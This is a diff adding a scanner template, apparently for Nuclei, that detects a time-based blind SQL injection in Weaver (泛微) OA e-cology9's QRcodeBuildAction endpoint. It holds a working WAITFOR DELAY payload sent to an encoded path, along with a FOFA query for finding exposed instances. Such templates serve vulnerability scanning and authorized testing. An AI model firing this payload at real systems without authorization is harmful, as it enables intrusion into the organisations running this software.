@@ -1,0 +1,50 @@
+id: poc-yaml-weaver-e-cology9-qrcodebuildaction-sqli
+
+info:
+  name: 泛微OA e-cology9 QRcodeBuildAction SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: e-cology
+    fofa: app="泛微-OA（e-cology）"
+
+variables:
+  t1: "{{rand_int(1,100000)}}"
+  t2: "{{rand_int(5,10)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - id: check-ecology-header
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "ecology"
+
+  - id: sqli-detection
+    method: POST
+    path:
+      - "{{BaseURL}}/weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "modeid={{t1}}+WAITFOR+DELAY+'0%3a0%3a{{t2}}'"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t2)"
+          - "duration < to_number(t3)"
